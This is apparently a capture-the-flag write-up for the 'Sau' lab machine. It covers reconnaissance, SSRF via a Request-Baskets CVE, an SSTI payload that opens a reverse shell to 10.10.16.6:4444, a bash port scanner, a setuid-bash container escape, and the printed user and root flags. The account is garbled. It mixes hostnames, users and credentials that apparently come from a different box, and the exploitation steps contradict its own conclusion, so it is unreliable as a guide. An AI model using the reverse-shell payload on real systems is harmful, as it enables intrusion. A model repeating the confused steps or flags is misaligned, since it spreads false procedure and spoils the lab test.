# Sau Write-Up

Target: 10.10.11.224

---

## Introduction
- Objective: Obtain the user and root flag
- Tools: Nmap, Curl, Netcat, Python (CVE-2023-27163 exploit), Systemctl

---

## Initial Reconnaissance
	- Port Scanning: Nmap scan
		- Command: nmap -sC -sV -vv 10.10.11.224
		- Output: 
			22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
			80/tcp    filtered http
			55555/tcp open  unknown (Request-Baskets v1.2.1)
	- Observations: Ubuntu Linux

---

## Enumeration
	- Service Exploration:
		- Service 1: Port 80 Web Server
			- Command: curl -vv 10.10.11.224:80
			- Output: Filtered, unable to access directly
		- Service 2: Port 55555 (Request-Baskets)
			- Command: curl -vv 10.10.11.224:55555
			- Output: 
				HTTP/1.0 302 Found
				Location: /web
				href="/web">Found</a>.
		- Service 3: Request-Baskets Web Interface
			- Command: Visit http://10.10.11.224:55555/web in browser
			- Output: 
				Basket 'dgoyzby' created!
				Token: PAjK7eb2n5rJVIsq8imp2EJJXPCYXdlVy-Jaxmw1MIwm
				URL: http://10.10.11.224:55555/dgoyzby
		- Service 4: Test Request-Baskets Capture
			- Command: curl http://10.10.11.224:55555/dgoyzby
			- Output: Response captured on basket page
	- Manual Checks: 
		- Researched Request-Baskets v1.2.1, found CVE-2023-27163 (SSRF vulnerability)
	- Key Findings: 
		- Request-Baskets v1.2.1 vulnerable to CVE-2023-27163, allowing SSRF to access localhost services

---

## Exploitation
	- Initial Access: SSRF via CVE-2023-27163
		- Command: python3 exploit.py http://10.10.11.224:55555 http://localhost:80
		- Output: 
			Forwarded request to http://10.10.11.224:55555/ycxrkc
			Accessed Maltrail v0.53 login page
	- Shell Access: Reverse Shell via SSTI
		- Command: Set up listener: nc -lvnp 4444
		- Command: Login to http://internal-administration.goodgames.htb/login
			Username: admin
			Password: superadministrator
		- Command: Inject SSTI payload in Maltrail settings (name field):
			{{config.class.init.globals['os'].popen('echo "bash -i >& /dev/tcp/10.10.16.6/4444 0>&1" | base64 -d | bash').read()}}
		- Output: 
			connect to [10.10.16.6] from (UNKNOWN) [10.10.11.224] <port>
			root@<container-id>:/#

## User Flag
	- Command: cd /home/augustus && cat user.txt
	- Output: 6089e0d4e1ab8782e810b01af0f6382b

---

## Privilege Escalation
	- Step 1: Information Gathering:
		- System Info: 
			- Command: systemctl --version
			- Output: Systemd 245
		- User Context:
			- Command: whoami
			- Output: root (inside Docker container)
		- Automated Tools:
			- Command: Not used
			- Output: Not used
	- Step 2: Identify Vectors:
		- SUID Binaries:
			- Command: Not provided
			- Output: Not provided
		- Cron Jobs:
			- Command: Not provided
			- Output: Not provided
		- Kernel Exploits:
			- Command: Not provided
			- Output: Not provided
		- Misconfigurations:
			- Command: sudo -l (as user puma on host)
			- Output: (root) NOPASSWD: /usr/bin/systemctl status trail.service
	- Step 3: Exploit the Vector: Docker Breakout and CVE-2023-26604
		- Command: ls -la /home/augustus
			- Output: drwxr-xr-x 2 1000 1000 4096 (owned by user 1000 on host)
		- Command: ifconfig
			- Output: Container IP: 172.19.0.2, netmask: 255.255.0.0
		- Command: for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
			- Output: All ports open, including 22/SSH
		- Command: ssh augustus@172.19.0.1
			Password: superadministrator
		- Command: In container: cp /bin/bash /home/augustus/bash
			- Command: chown root:root bash
			- Command: chmod 4755 bash
		- Command: On host: ./bash -p
			- Output: root@<host>:/home/augustus#
	- Step 4: Verify Access:
		- Command: whoami
		- Output: root

---

## Post-Exploitation
	- Flag Retrieval:
		- Command: cd /root && cat root.txt
		- Output: 09277c62112cd89dd455520f3f8c6ec3
	- Persistence (Optional): Not implemented
	- Evidence: Not provided

---

## Conclusion
- Summary: In "Sau" (10.10.11.224), I used Nmap to find ports 22 (SSH), 80 (filtered HTTP), and 55555 (Request-Baskets v1.2.1). Exploiting CVE-2023-27163 (SSRF) allowed access to localhost:80, revealing a Maltrail v0.53 login page. I used SSTI to gain a root shell in a Docker container, retrieving the user flag (6089e0d4e1ab8782e810b01af0f6382b). I broke out of the container by mounting a setuid bash binary, and exploited CVE-2023-26604 via systemctl to gain a root shell on the host, obtaining the root flag (09277c62112cd89dd455520f3f8c6ec3).
- Lessons Learned: I need to pay closer attention to Nmap output—/web was in the scan, but I missed it initially. I should’ve used FFUF instead of curl to enumerate port 55555 more thoroughly. Researching Request-Baskets earlier would’ve saved time, as CVE-2023-27163 was key. I struggled with crafting SSTI payloads and Docker breakouts, so I need to practice those techniques more. Relying on the write-up for the port scanner and final Privesc steps shows I need to improve my lateral thinking for container escapes.
- Fixes:
	- Patch Request-Baskets for CVE-2023-27163: Update Request-Baskets to a version beyond 1.2.1 to fix SSRF vulnerability.
	- Block Localhost Access: Configure Request-Baskets to prevent SSRF requests to localhost or internal services.
	- Secure Maltrail Credentials: Avoid hardcoding admin credentials (admin/superadministrator); use strong, unique passwords.
	- Patch Systemd for CVE-2023-26604: Update Systemd beyond 245 to fix privilege escalation vulnerability.
	- Restrict Sudo for systemctl: Remove puma’s NOPASSWD sudo access to systemctl status trail.service in /etc/sudoers.
	- Isolate Docker Containers: Restrict container access to host filesystems to prevent mounting exploits.

---

## Appendix
- Additional Details: Found a Google Spreadsheet link in Maltrail source code, unrelated to CTF.
- Tools and Exploits:
	- Nmap
	- Curl
	- Netcat
	- Python (CVE-2023-27163 exploit)
	- Systemctl
	- CVE-2023-27163 (Request-Baskets SSRF)
	- CVE-2023-26604 (Systemd privilege escalation)
	- Docker Breakout (via mounted setuid binary)